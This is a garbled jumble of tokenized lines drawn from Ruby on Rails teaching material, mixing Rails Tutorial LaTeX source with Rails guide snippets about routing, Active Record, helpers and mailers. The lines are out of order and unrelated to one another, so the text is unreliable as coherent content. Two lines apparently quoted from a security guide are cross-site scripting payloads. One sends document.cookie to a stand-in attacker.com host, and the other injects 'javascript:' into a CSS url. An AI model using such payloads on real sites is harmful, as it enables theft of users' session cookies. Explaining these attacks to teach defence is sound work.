▁We ' ll ▁start ▁by ▁making ▁a ▁partial ▁to ▁display ▁the ▁following ▁and ▁ follower ▁ st at ist ic s ▁on ▁the ▁profile ▁and ▁ home ▁pages .
▁You ▁should ▁feel ▁free ▁to ▁visit ▁the ▁signup ▁page ▁and ▁create ▁a ▁new ▁user ▁at ▁this ▁time .
▁-> ▁0▖0 02 3 s
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title ▖
▁Action ▁Mailer ▁Configuration
▁ New ▁routes ▁are ▁defined ▁in ▁the ▁file ▁\ k ode { config / routes ▖ rb } .
▁The ▁syntax
▁This ▁technique ▁should ▁be ▁used ▁with ▁caution .
▁Creat ing ▁a ▁resource ful ▁route ▁will ▁also ▁expose ▁a ▁number ▁of ▁helpers ▁to ▁the ▁controllers ▁in ▁your ▁application ▖
▁If ▁the ▁above ▁ sequence ▁seem s ▁ im p la us ible , ▁believe ▁me , ▁it ▁isn ' t : ▁it ▁can ▁happen ▁on ▁any ▁Rails ▁website ▁with ▁significant ▁traffic ▁( which ▁I ▁once ▁ learned ▁the ▁hard ▁way ) .
▁In ▁particular , ▁simple ▁routing ▁make s ▁it ▁very ▁easy ▁to ▁map ▁ legacy ▁URLs ▁to ▁new ▁Rails ▁actions .
▁assemblies ▖ find (▖▖▖)
▁< div ▁style =" background : url (' javascript : alert (1) ') ">
▁< h 1> New ▁Article </ h 1>
▁ / microposts / new
▁as ▁show n ▁in ▁Listing ~\ ref { code : Gemfile _ pg _ gem } .
▁< script > document ▖ write (' < img ▁src =" http :// www ▖ attacker ▖ com / ' ▁+ ▁document ▖ cookie ▁+ ▁' "> ') ; </ script >
▁It ' s ▁time ▁to ▁create ▁a ▁second ▁one , ▁the ▁Users ▁controller .
▁Note ▁that ▁we ▁write ▁the ▁commit ▁message ▁in ▁the ▁\ emph { present } ▁t en se .
▁* ▁Rails ▁4▖0 ▁has ▁removed ▁` ActionDispatch :: B est S t and ar d s S up port ` ▁middleware , ▁`< ! D O C TYPE ▁ html >` ▁already ▁trigger s ▁standard s ▁mode ▁per ▁ http :// m s d n ▖ micro s of t ▖ com / en - us / library / j j 6 76 9 15 ( v = v s ▖ 8 5 )▖ as p x ▁and ▁C h r o me Frame ▁header ▁has ▁been ▁mov ed ▁to ▁` config ▖ action _ dispatch ▖ default _ headers ` .
▁` beginning _ of _ quarter ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ quarter `, ▁and ▁` end _ of _ quarter ` ▁is ▁alias ed ▁to ▁` at _ end _ of _ quarter ` .
▁N u ll ▁ Relation
▁Of ▁course , ▁after ▁this ▁minor ▁refactoring ▁the ▁test ▁suite ▁should ▁ still ▁be ▁\ passing :
▁rake ▁db : migrate ▁S C O P E = blorgh
▁The ▁second ▁\ k ode { link \_ to } ▁shows ▁off ▁the ▁\ k ode { image \_ tag } ▁helper , ▁which ▁take s ▁as ▁arguments ▁the ▁path ▁to ▁an ▁image ▁and ▁an ▁optional ▁options ▁hash , ▁in ▁this ▁case ▁setting ▁the ▁\ k ode { alt } ▁attribute ▁of ▁the ▁image ▁tag ▁using ▁symbols .
▁### ▁C on version s
▁( Don ' t ▁worry ▁about ▁the ▁Ruby ▁syntax ▁right ▁now ; ▁it ▁will ▁be ▁covered ▁in ▁more ▁ de p th ▁in ▁Chapter ~\ ref { cha : rails _ flavored _ ruby } ▖)
▁Defaults ▁to ▁` true ` ▖╼
▁### ▁Re t ri e v ing ▁a ▁S ing le ▁Object
▁\ href { http :// screencasts ▖ railstutorial ▖ org /}{ The ▁Ruby ▁on ▁Rails ▁Tutorial ▁ screencasts } : ▁I ▁offer ▁a ▁full - length ▁ screen c a st ▁course ▁base d ▁on ▁this ▁book .
▁in ▁Listing ~\ ref { code : password _ implementation } .
▁S ince ▁a ▁user ▁object ▁is ▁ n either ▁\ k ode { nil } ▁no r ▁\ k ode { false }, ▁it ▁does ▁the ▁job ▁nicely
▁The ▁\ k ode { < nav > } ▁tag , ▁though ▁form ally ▁unnecessary ▁here , ▁is ▁used ▁to ▁more ▁clear ly ▁communicat e ▁the ▁purpose ▁of ▁the ▁navigation ▁links .
▁P utting ▁all ▁this ▁together ▁gives ▁the ▁updated ▁micropost ▁fixtures ▁in ▁Listing ~\ ref { code : updated _ micropost _ fixtures } .
▁By ▁the ▁way , ▁if ▁you ▁ever ▁make ▁a ▁mistake ▁when ▁ generating ▁code , ▁it ' s ▁useful ▁to ▁know ▁how ▁to ▁ reverse ▁the ▁process .
▁You ▁should ▁use ▁this ▁helper ▁when ▁your ▁model ▁has ▁associations ▁with ▁other ▁models ╼ and ▁they ▁also ▁need ▁to ▁be ▁validate d ▖
▁* ▁A v o id ing ▁name ▁co ll is ion s
▁* ▁` before _ perform `
▁#### # ▁` create _ association ( attributes ▁= ▁{}) `
▁In ▁this ▁section ▁of ▁the ▁guide ▁you ' ll ▁learn ▁how ▁to ▁setup ▁the ▁tests ▁on ▁your ▁own ▁computer .
▁S t u d y ▁the ▁entry ▁in ▁the ▁Rails ▁API ▁for ▁the ▁\ k ode { validates } ▁method ▁to ▁learn ▁more ▁about ▁its ▁cap a b i li t ies ▁and ▁options .
▁#### ▁` to _ formatted _ s `
▁Of ▁course , ▁current ly ▁user ▁activation ▁doesn ' t ▁actually ▁\ emph { do } ▁anything , ▁because ▁we ▁have n ' t ▁changed ▁how ▁users ▁log ▁in .
▁If ▁there ' s ▁any ▁element ▁that ▁does ▁not ▁be long ▁to ▁the ▁type ▁of ▁the ▁first ▁one ▁the ▁root ▁ n ode ▁becomes ▁" objects " :
▁The ▁string ▁' foobar ' ▁is ▁nonempty .
▁Before ▁filter s ▁use ▁the ▁\ k ode { before \_ action } ▁command ▁to ▁arrange ▁for ▁a ▁particular ▁method ▁to ▁be ▁called ▁before ▁the ▁given ▁actions
▁# ▁If ▁the ▁user ▁is ▁ locked ▁the ▁ increment ▁is ▁ lo st , ▁no ▁big ▁deal .
▁There ▁are ▁no ▁form al ▁ prerequisites ▁to ▁this ▁book --- the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁contains ▁in te gr at ed ▁tutorial s ▁not ▁only ▁for ▁Rails , ▁but ▁also ▁for ▁the ▁under ly ing ▁Ruby ▁language , ▁the ▁default ▁Rails ▁testing ▁framework ▁( M in i Test ), ▁the ▁Unix ▁command ▁line , ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / HTML } { HTML }, ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / CSS } { CSS }, ▁a ▁small ▁amount ▁of ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / JavaScript } { JavaScript }, ▁and ▁even ▁a ▁little ▁\ href { http :// en ▖ w ikipedia ▖ org / wiki / SQL } { SQL } .
▁* ▁For ▁` belongs _ to ` ▁associations , ▁` has _ many ` ▁ inverse ▁associations ▁are ▁ignore d .
▁If ▁any ▁ INSERT ▁or ▁ UPDATE ▁take s ▁place ▁then ▁the ▁cache ▁is ▁clean ed .
▁* ▁How ▁to ▁find ▁records ▁using ▁a ▁variety ▁of ▁methods ▁and ▁conditions .
▁* ▁` Time ` ▁understand s ▁D ST , ▁so ▁you ▁get ▁correct ▁D ST ▁ calculations ▁as ▁in
▁For ▁example , ▁this ▁association ▁uses ▁two ▁such ▁options :
▁The ▁application ▁code ▁simply ▁involve s ▁calling ▁\ k ode { log \_ out } ▁only ▁if ▁\ k ode { logged \_ in ?}\ ▁is ▁true , ▁as ▁show n ▁in ▁Listing ~\ ref { code : destroy _ forget } .
▁class _ attribute ▁: x
▁* ▁` resource _ controller ` ▁defines ▁which ▁generator ▁to ▁use ▁for ▁ generating ▁a ▁controller ▁when ▁using ▁` rails ▁generate ▁resource ` ▖
▁If ▁your ▁change ▁has ▁an ▁ im p ac t ▁on ▁the ▁perform ance ▁of ▁Rails , ▁please ▁use ▁the ╼[ benchmark - ips ]( https :// github ▖ com / e v an ph x / benchmark - ips ) ▁gem ▁to ▁provide ╼ benchmark ▁results ▁for ▁compar is on .
▁### ▁The ▁Rake ▁T as k
▁* ▁`: authentication ` ▁- ▁If ▁your ▁mail ▁server ▁requires ▁authentication , ▁you ▁need ▁to ▁specify ▁the ▁authentication ▁type ▁here ▖
▁As ▁we ' ll ▁see , ▁many ▁of ▁the ▁steps ▁are ▁similar , ▁and ▁we ▁will ▁have ▁sever al ▁opportunit ies ▁to ▁apply ▁the ▁less on s ▁ learned ▁in ▁Section ~\ ref { sec : account _ activation } .
▁S ince ▁` errors [: base ]` ▁is ▁an ▁array , ▁you ▁can ▁simply ▁add ▁a ▁string ▁to ▁it ▁and ▁it ▁will ▁be ▁used ▁as ▁an ▁error ▁message .
▁A ▁mockup ▁of ▁the ▁user ▁followers ▁page .
▁Expires Default ▁" access ▁plus ▁1 ▁ year "
▁This ▁prevent s ▁a ▁third - part y ▁site ▁from ▁refer en c ing ╼ your ▁JavaScript ▁URL ▁and ▁attempt ing ▁to ▁run ▁it ▁to ▁ extract ▁ sensitive ▁data .
▁* ▁FROM ▁` articles ` ▁WHERE ▁` articles ` ▖ ` user _ id ` ▁ IN ▁ (1)
▁For ▁a ▁fresh ly ▁generated ▁Rails ▁application , ▁this ▁m ight ▁produce ▁something ▁like :
▁to ▁get ▁to ▁the ▁same ▁place , ▁but ▁\ k ode { / about } ▁is ▁more ▁succinct .
▁Logging ▁in ▁the ▁user ▁upon ▁signup .
▁# ▁=> ▁Tue , ▁09 ▁A ug ▁2011 ▁ 23 : 15 : 17 ▁+0000
▁If ▁you ' d ▁like ▁to ▁share ▁your ▁pro gr ess ▁at ▁this ▁point , ▁feel ▁free ▁to ▁send ▁a ▁t we e t ▁or ▁ Facebook ▁status ▁update ▁with ▁something ▁like ▁this :
▁This ▁table ▁should ▁be ▁created ▁without ▁a ▁primary ▁key :
▁\ href { http :// www ▖ t hinkful ▖ com / a / railstutorial } { T hinkful } : ▁An ▁online ▁class ▁that ▁pair s ▁you ▁with ▁a ▁ professional ▁engine er ▁as ▁you ▁work ▁through ▁a ▁project - base d ▁c ur r ic ul um
▁All ▁of ▁the ▁above ▁methods ▁return ▁an ▁instance ▁of ▁` ActiveRecord :: Relation ` .
▁Be side s ▁that , ▁one ▁can ▁use ▁` deep _ transform _ keys ` ▁and ▁` deep _ transform _ keys !` ▁to ▁perform ▁the ▁block ▁operation ▁on ▁all ▁the ▁keys ▁in ▁the ▁given ▁hash ▁and ▁all ▁the ▁hashes ▁nested ▁into ▁it ▖
▁class ▁P h y s ic i an ▁< ▁ActiveRecord :: Base
▁d ▖ prev _ year ▁# ▁=> ▁Fri , ▁ 08 ▁May ▁200 9
▁literal ▁`` at ▁sign ''
▁Now ▁that ▁we ▁have ▁a ▁helper , ▁we ▁can ▁use ▁it ▁to ▁ s im p li fy ▁our ▁layout ▁by ▁replacing
▁in ▁the ▁Micropost ▁model .
▁\ k ode { f ▖ object } ▁is ▁\ k ode {@ micropost }, ▁etc .
▁With ▁the ▁\ k ode { signed \_ in ?}\ ▁method ▁in ▁hand , ▁we ' re ▁ready ▁to ▁finish ▁the ▁layout ▁links .
▁get ▁' photos / : id ', ▁to : ▁' photos # show ', ▁constraints : ▁ { ▁id : ▁ / [ A - Z ] \ d { 5 } / ▁ }
▁Because ▁of ▁the ▁\ line break ▁\ k ode { navbar - fixed - to p } ▁class ▁in ▁the ▁\ k ode { header } ▁tag , ▁Bootstrap ▁fix es ▁the ▁navigation ▁bar ▁to ▁the ▁to p ▁of ▁the ▁page , ▁so ▁the ▁p adding ▁serve s ▁to ▁separate ▁the ▁main ▁text ▁from ▁the ▁navigation .
▁Rails ╼ will ▁default ▁to ▁` text / plain ` ▁otherwise .
▁A lthough ▁people ▁are ▁some times ▁ s lo p p y ▁about ▁including ▁the ▁\ k ode { alt } ▁attribute ▁for ▁images , ▁it ▁is ▁in ▁fact ▁required ▁by ▁the ▁HTML ▁standard .
▁A lthough ▁we ▁won ' t ▁need ▁the ▁Microposts ▁controller ▁un til ▁Section ~\ ref { sec : manipulati n g _ microposts }, ▁we ▁will ▁need ▁the ▁views ▁directory ▁in ▁just ▁a ▁moment , ▁so ▁let ' s ▁generate ▁the ▁controller ▁now :
▁* ▁` before _ configuration `: ▁This ▁is ▁run ▁as ▁soon ▁as ▁the ▁application ▁constant ▁inherit s ▁from ▁` Rails :: Application ` ▖
▁# ▁=> ▁" 200 9 - 10 - 25 ▖ ▖ 200 9 - 10 - 2 6 "
▁The ▁default ▁is ▁` " @ _ % s " ` .
▁The ▁following ▁link ▁present ed ▁a ▁page ▁which ▁state d ▁that ▁" G e org e ▁B us h ▁a p point ed ▁a ▁ 9 ▁ year ▁old ▁ bo y ▁to ▁be ▁the ▁ cha ir person ▖▖▖" :
▁╼╼ ▁\ section { A ▁Micropost ▁model } ▁% ▁( fold )╼ ▁\ label { sec : a _ micropost _ model }╼╼
▁The ▁contents ▁of ▁the ▁partial ▁appear ▁in ▁Listing ~\ ref { code : errors _ partial } .
▁E s c a pe ▁any ▁input ▁value ▁using ▁the ▁h () ▁method .
▁As ▁you ▁m ight ▁guess , ▁in ▁addition ▁to ▁\ k ode { patch } ▁Rails ▁tests ▁support ▁\ k ode { get }, ▁\ k ode { post }, ▁and ▁\ k ode { delete } ▁as ▁well ▖)
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ order _ test } .
▁get ▁' search '
▁Note ▁also ▁that ▁we ▁take ▁care ▁to ▁\ k ode { upcase } ▁the ▁user ' s ▁email ▁address ▁to ▁make ▁sure ▁our ▁ability ▁to ▁find ▁the ▁user ▁in ▁the ▁database ▁is ▁case - insensitive .
▁\ href { http :// r ailscasts ▖ com /}{ RailsCasts } ▁by ▁ Ryan ▁Bates : ▁E x ce ll ent ▁( mostly ) ▁free ▁Rails ▁ screencasts
▁Using ▁an ▁engine ▁within ▁an ▁application ▁is ▁very ▁easy ▖
▁NOTE : ▁The ▁` Application Controller ` ▁class ▁being ▁inherit ed ▁from ▁here ▁is ▁the ╼` Blorgh :: Application Controller `, ▁not ▁an ▁application ' s ▁` Application Controller ` .
▁If ▁you ' d ▁like ▁to ▁use ▁a ▁different ▁status ▁code , ▁p erhaps ▁30 1, ▁a ▁ permanent ▁redirect , ▁you ▁can ▁use ▁the ▁`: status ` ▁option :
▁ Go ▁a head , ▁ play ▁around ▁with ▁the ╼ new ly ▁m o un ted ▁engine ▖
▁### ▁Layouts
▁# ▁=> ▁ { : a =>1 }
▁In ▁this ▁section , ▁we ' ll ▁take ▁the ▁first ▁steps ▁toward ▁the ▁final ▁profile ▁by ▁making ▁a ▁page ▁to ▁display ▁a ▁user ' s ▁name ▁and ▁profile ▁ photo , ▁as ▁indicate d ▁by ▁the ▁mockup ▁in ▁Figure ~\ ref { fig : profile _ mockup _ profile _ name }
▁You ▁can ▁pass ▁in ▁a ▁ numeric al ▁argument ▁to ▁the ▁` last ` ▁method ▁to ▁return ▁up ▁to ▁that ▁number ▁of ▁results ▖
▁We ' ll ▁put ▁this ▁fact ▁to ▁good ▁use ▁starting ▁in ▁Section ~\ ref { sec : showing _ microposts } ▖)
▁For ▁example , ▁if ▁each ▁ supplier ▁has ▁one ▁account , ▁and ▁each ▁account ▁is ▁ associated ▁with ▁one ▁account ▁ history , ▁then ▁the ╼ supplier ▁model ▁could ▁look ▁like ▁this :
▁On ce ▁you ' ve ▁created ▁the ▁\ k ode { about ▖ html ▖ erb } ▁file ▁in ▁the ▁right ▁directory , ▁you ▁should ▁fill ▁it ▁with ▁the ▁contents ▁show n ▁in ▁Listing ~\ ref { code : custom _ about _ page } .
▁╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : toy _ app _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁* ▁any ▁other ▁object ▁that ▁respond s ▁to ▁` empty ?` ▁and ▁is ▁empty .
▁as ▁seen ▁in ▁Listing ~\ ref { code : application _ layout _ full _ title } .
▁* ▁X - Content - Security - P ol ic y
▁This ▁method ▁receive s ▁a ▁hash ▁with ▁keys ▁`: years `, ▁`: months `, ▁`: weeks `, ▁`: day s `, ▁and ▁returns ▁a ▁date ▁advanced ▁as ▁much ▁as ▁the ▁present ▁keys ▁indicate :
▁* ▁` config ▖ beginning _ of _ week ` ▁set s ▁the ▁default ▁beginning ▁of ▁ week ▁for ▁the ╼ application ▖
▁This ▁may ▁be ▁hand y ▁for ▁example ▁to ▁get ▁a ▁better ▁name :
▁By ▁including ▁both ▁the ▁\ k ode { user \_ id } ▁and ▁\ k ode { created \_ at } ▁columns ▁as ▁an ▁array , ▁we ▁arrange ▁for ▁Rails ▁to ▁create ▁a ▁\ emph { multiple ▁key ▁index }, ▁which ▁means ▁that ▁Active ▁Record ▁uses ▁\ emph { bo th } ▁keys ▁at ▁the ▁same ▁time .
▁A ▁partial ▁for ▁display ing ▁ follower ▁ stats .
▁When ▁writing ▁CoffeeScript , ▁you ' ll ▁often ▁want ▁to ▁do ▁some ▁sort ▁of ▁process ing ▁upon ╼ page ▁load ▖
▁JavaScript ▁can ▁also ▁make ▁requests ▁to ▁the ▁server , ▁and ▁ parse ▁the ▁response ▖
▁See ▁[ Security ▁G u ide ]( security ▖ html # un safe - query - g en er ation )╼ ▁for ▁more ▁information ▖
▁So ▁first , ▁let ' s ▁add ▁the ▁delete ▁link ▁in ▁the ╼` app / views / comments / _ comment ▖ html ▖ erb ` ▁partial :
▁Because ▁we ' re ▁ modeling ▁ activations ▁using ▁an ▁ Account ▁ Activations ▁resource , ▁the ▁token ▁itself ▁can ▁appear ▁as ▁the ▁argument ▁of ▁the ▁named ▁route ▁defined ▁in ▁Listing ~\ ref { code : account _ activations _ route } :
▁Note ▁that ▁Listing ~\ ref { code : a _ test _ for _ valid _ submission } ▁also ▁verifie s ▁that ▁the ▁user ▁show ▁template ▁render s ▁following ▁successful ▁signup .
▁Of ▁course , ▁ requiring ▁users ▁to ▁log ▁in ▁isn ' t ▁quite ▁enough ; ▁users ▁should ▁only ▁be ▁allow ed ▁to ▁edit ▁their ▁\ emph { own } ▁information .
▁Creat ing ▁a ▁ New ▁Rails ▁ Project
▁A ▖ x ▁= ▁: a
▁If ▁you ▁don ' t ▁already ▁have ▁it , ▁you ▁should ▁\ href { http :// ruby for ge ▖ org / f rs / ? group _ id = 12 6 } { download ▁ RubyGems }, ▁ extract ▁it , ▁and ▁then ▁go ▁to ▁the ▁\ k ode { rubygems } ▁directory ▁and ▁run ▁the ▁setup ▁program :
▁but ▁Rails ▁allows ▁us ▁to ▁link ▁directly ▁to ▁the ▁user , ▁in ▁this ▁context ▁automatically ▁convert ing ▁\ k ode { current \_ user } ▁into ▁\ k ode { user \_ path ( current \_ user )} .
▁Thu s , ▁token s ▁are ▁validate d ▁by ▁un ma s k ing ▁and ▁then ▁ de crypt ing ▖
▁T hanks ▁to ▁running ▁\ k ode { rails ▁new } ▁in ▁Section ~\ ref { sec : the _ first _ application } ▁and ▁\ k ode { bundle ▁install } ▁in ▁Section ~\ ref { sec : bundler }, ▁we ▁already ▁have ▁an ▁application ▁we ▁can ▁run --- but ▁how ?
▁#
▁Implement ▁it ▁and ▁click ▁on ▁a ▁pagination ▁link ▁to ▁see ▁why .
▁* ▁X - Frame - Options
▁* ▁[ In tr o d u c ing ▁Rack ]( http :// ch ne u k ir ch en ▖ org / blog / archive / 200 7 / 02 / in tr o d u c ing - rack ▖ html )
▁#< Client ▁id : ▁2, ▁first _ name : ▁" J an " ▁> ,
▁Return s ▁an ▁instance ▁of ▁the ▁class ▁` ActiveModel :: Error s ` ▁containing ▁all ▁errors ▖
▁Similar ly , ▁you ▁can ▁retrieve ▁`@ product ▖ picture s ` .
▁page ▁to ▁edit ▁user ▁with ▁id ▁\ k ode {1}
▁make : ▁ / us r / bin / g cc - 4 ▖ 2 : ▁No ▁such ▁file ▁or ▁directory
▁( If ▁you ▁happen ▁to ▁be ▁in ▁the ▁third ▁ category , ▁soon ▁you ▁won ' t ▁be ▁any ▁longer ▖)
▁We ' ll ▁focus ▁now ▁on ▁using ▁active ▁relationships ▁to ▁generate ▁a ▁list ▁of ▁followed ▁users , ▁and ▁consider ▁the ▁ passive ▁case ▁in ▁Section ~\ ref { sec : followers } .
▁### ▁Active ▁Model
▁< p > Employee : ▁<%= ▁ employee ▖ name ▁%></ p >
▁< a ▁ href ="# " ▁on click =" paintIt ( this , ▁' # 99 0 000 ') "> P aint ▁it ▁red </ a >
▁ DateTime ▖ current ▖ change ( month : ▁2, ▁day : ▁30 )
▁ ╼\ end { code }╼\ end { code listing }╼╼ ▁% ▁subsection ▁route _ tests ▁( end )╼╼ ▁\ subsection { Rails ▁routes } ▁% ▁( fold )╼ ▁\ label { sec : rails _ routes }╼╼ To ▁add ▁the ▁named ▁routes ▁for ▁the ▁sample ▁app ' s ▁static ▁pages , ▁we ' ll ▁edit ▁the ▁routes ▁file , ▁\ k ode { config / \ - routes ▖ rb }, ▁that ▁Rails ▁uses ▁to ▁define ▁URL ▁m app ing s ▖
▁There ▁is ▁at ▁least ▁one ▁exception , ▁however : ▁The ▁output ▁has ▁to ▁be ▁escape d ▁in ▁the ▁controller ▁already , ▁if ▁the ▁action ▁doesn ' t ▁render ▁a ▁view .
▁The ▁h y p er text ▁ tr an s f er ▁protocol ▁(\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hyper text _ Transfer _ Protocol # Request _ methods } { HTTP }) ▁defines ▁the ▁basic ▁operations ▁\ text tt { GET }, ▁\ text tt { POST }, ▁\ text tt { PATCH }, ▁and ▁\ text tt { DELETE } .
▁To ▁run ▁a ▁single ▁test ▁again st ▁all ▁adapter s , ▁use :
▁We ▁end ▁our ▁discussion ▁of ▁the ▁toy ▁application ▁with ▁a ▁brief ▁ description ▁of ▁the ▁controller ▁and ▁model ▁class ▁ hierarchies ▁in ▁Rails .
▁#### ▁` first ( limit ▁= ▁1) `
▁#### ▁ Follow ▁the ▁Co d ing ▁ Convention s
▁With ▁`: allow _ nil ` ▁the ▁call ▁` user ▖ name ` ▁returns ▁` nil ` ▁if ▁the ▁user ▁has ▁no ▁profile .
▁Load ing ▁development ▁environment
▁# ▁=> ▁Return s ▁all ▁names , ▁even ▁if ▁there ▁are ▁duplicate s
▁In ▁the ▁present ▁case , ▁we ▁want ▁to ▁use ▁the ▁\ k ode { index } ▁action ▁in ▁the ▁Users ▁controller , ▁which ▁we ▁can ▁arrange ▁using ▁the ▁code ▁show n ▁in ▁Listing ~\ ref { code : rails _ routes _ root _ route } .
▁The ▁second ▁argument , ▁` indent _ string `, ▁specifie s ▁which ▁ indent ▁string ▁to ▁use ▖
▁a
▁It ▁also ▁cause s ▁the ▁engine ' s ▁routes ▁to ╼ be ▁ isolate d ▁from ▁those ▁routes ▁that ▁are ▁within ▁the ▁application ▖
▁in ▁Listing ~\ ref { code : relationship _ create _ test } ▁and
▁Rails ▁ layouts ▁allow ▁the ▁use ▁of ▁a ▁common ▁template ▁for ▁pages ▁in ▁our ▁application , ▁there by ▁eliminat ing ▁duplication .
▁A ▁re c a p ▁of ▁the ▁initial ▁User ▁pages ▁ spec .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : log _ out _ with _ _ close _ browser }
▁| ▁DELETE ▁| ▁ / photos / : id ▁| ▁photos # destroy ▁| ▁image _ path (: id ) ▁|
▁As ▁a ▁result , ▁we ▁get ▁the ▁best ▁of ▁both ▁world s : ▁multiple ▁nicely ▁ formatted ▁files ▁for ▁programmer ▁convenience , ▁with ▁single ▁optimized ▁files ▁in ▁production .
▁By ▁default , ▁files ▁are ▁loaded ▁from ▁` public / audio s ` .
▁The ▁method ▁` deep _ merge !` ▁perform s ▁a ▁ deep ▁merge ▁in ▁place .
▁to ▁actually ▁visit ▁the ▁ target ▁page .
▁Your ▁editor ▁may ▁display ▁a ▁message ▁like ▁`` invalid ▁ multi by te ▁character '' , ▁but ▁this ▁is ▁not ▁a ▁cause ▁for ▁concern .
▁duplicate ▁# ▁=> ▁[ ' string ', ▁' another - string ']
▁The ▁result ▁appears ▁in ▁Figure ~\ ref { fig : heroku _ app } .
▁has _ and _ belongs _ to _ many ▁: client s
▁There ▁are ▁10 ▁kind s ▁of ▁people ▁in ▁the ▁world : ▁Those ▁who ▁like ▁the ▁ ternary ▁operator , ▁those ▁who ▁don ' t , ▁and ▁those ▁who ▁don ' t ▁know ▁about ▁it .
▁It ' s ▁ probably ▁not ▁entire ly ▁clear ▁at ▁this ▁point ▁why ▁ putting ▁your ▁source ▁under ▁version ▁control ▁does ▁you ▁any ▁good , ▁so ▁let ▁me ▁give ▁just ▁one ▁example .
▁Before ▁you ▁can ▁start ▁build ing ▁the ▁application ,╼ you ▁need ▁to ▁make ▁sure ▁that ▁you ▁have ▁Rails ▁itself ▁installed .
▁This ▁is ▁a ▁defin ite ▁improve ment , ▁but ▁we ▁can ▁do ▁even ▁better : ▁we ▁can ▁call ▁\ k ode { render } ▁\ emph { d ir ec t ly } ▁on ▁the ▁\ k ode {@ users } ▁variable ▁( Listing ~\ ref { code : index _ final _ refactoring }) .
▁This ▁file ▁allows ▁you ▁to ▁specify ▁a ▁layout ╼ for ▁the ▁engine ▖
▁This ▁mode ▁uses ▁more ▁memory , ▁perform s ▁more ▁ po or ly ▁than ▁the ▁default ▁and ▁is ▁not ╼ re com m end ed .
▁ ╼ ▁end
▁To ▁add ▁page ▁title s , ▁we ▁need ▁to ▁learn ▁( or ▁review ) ▁the ▁structure ▁of ▁a ▁typical ▁web ▁page , ▁which ▁take s ▁the ▁form ▁show n ▁in ▁Listing ~\ ref { code : html _ structure } .
▁The ▁entire ▁HTML ▁ s k e let on ▁structure ▁is ▁repeated ▁on ▁each ▁page .
▁Before ▁filter s ▁give ▁a ▁standard ▁way ▁to ▁run ▁methods ▁before ▁particular ▁controller ▁actions .
▁the ▁\ k ode { reverse \_ relationships } ▁association ▁uses ▁\ k ode { followed \_ id } :
▁create ▁app / models / user ▖ rb
▁mail ( to : ▁@ user ▖ email , ▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ')
▁" BigDecimal " ▁=> ▁" d ec im al ",
▁The ▁raw ▁ home ▁view ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }) .
▁If ▁ authenticated , ▁present ▁the ▁user ▁with ▁the ▁form ▁for ▁changing ▁the ▁password .
▁The ▁debug ▁output ▁in ▁Figure ~\ ref { fig : home _ page _ with _ debug } ▁gives ▁ potentially ▁useful ▁information ▁about ▁the ▁page ▁being ▁rendered :
▁* ▁This ▁is ▁a ▁manifest ▁file ▁that ' ll ▁automatically ▁include ▁all ▁the ▁stylesheets
▁Whi le ▁Rails ▁uses ▁in te ll ig ent ▁defaults ▁that ▁will ▁work ▁well ▁in ▁most ▁situation s , ▁there ▁may ▁be ▁time s ▁when ▁you ▁want ▁to ▁customize ▁the ▁behavior ▁of ▁the ▁` has _ one ` ▁association ▁reference ▖
▁For ▁example , ▁ / users /1/ edit ▁get s ▁route d ▁properly ▁to ▁the ▁\ k ode { edit } ▁action ▁of ▁the ▁Users ▁controller , ▁but ▁since ▁the ▁\ k ode { edit } ▁action ▁doesn ' t ▁exist ▁yet ▁actually ▁hit ting ▁that ▁URL ▁will ▁return ▁an ▁error .
▁See ▁the ▁\ href { http :// api ▖ rubyonrails ▖ org / v 4▖1▖ 5 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API ▁entry ▁on ▁callbacks } ▁for ▁more ▁information ▁on ▁which ▁callbacks ▁Rails ▁supports .
▁It ' s ▁worth ▁noting ▁that ▁this ▁chapter ▁saw ▁the ▁last ▁of ▁the ▁necessary ▁gem ▁installation s .
▁### ▁B ound ▁Parameters
▁S ile n c ing ▁exception s ▁is ▁also ▁possible ▁with ▁` suppress ` ▖
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : database _ migrations }, ▁the ▁ label ▁\ k ode { users } ▁in ▁Figure ~\ ref { fig : demo _ user _ model } ▁correspond s ▁to ▁a ▁\ emph { table } ▁in ▁a ▁database , ▁and ▁the ▁\ k ode { id }, ▁\ k ode { name }, ▁and ▁\ k ode { email } ▁attributes ▁are ▁\ emph { columns } ▁in ▁that ▁table .
▁If ▁the ▁block ▁returns ▁the ▁same ▁value ▁for ▁different ▁elements ▁no ▁collection ▁is ▁built ▁for ▁that ▁key ▖
▁#### ▁` foreign _ key `
▁"2013-03-11 ▁01:05:24" , ▁updated _ at : ▁"2013-03-11 ▁01:05:24" > ]
▁in ▁Listing ~\ ref { code : f _ error _ messages } .
▁We ▁could ▁also ▁assign ▁both ▁strings ▁a ▁variable ▁name :
▁Ou r ▁validations ▁for ▁the ▁\ k ode { name } ▁attribute ▁enforce ▁only ▁minimal ▁constraints --- any ▁non - blank ▁name ▁under ▁ 51 ▁characters ▁will ▁do --- but ▁of ▁course ▁the ▁\ k ode { email } ▁attribute ▁must ▁ satisf y ▁the ▁more ▁string ent ▁requirement ▁of ▁being ▁a ▁valid ▁email ▁address .
▁A ▁\ k ode { Gemfile } ▁with ▁added ▁gems ▁and ▁explicit ▁Ruby ▁version .
▁This ▁ s im p li f ies ▁ maintenance ▁and ▁keep s ▁things ▁clean ▁by ▁allow ing ▁related ▁code ▁to ╼ be ▁group ed ▁before ▁inclusion ▁else where .
▁As ▁with ▁the ▁Users ▁resource , ▁we ▁can ▁use ▁the ▁\ k ode { resources } ▁method ▁to ▁define ▁the ▁standard ▁RESTful ▁routes :
▁list ▁contents
▁There ' s ▁one ▁problem ▁with ▁this ▁form ▁though ▖
▁ ▖ ▖ .
▁#### ▁` parent _ name `
▁The ▁user ▁index ▁page ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁with ▁a ▁second ▁user .
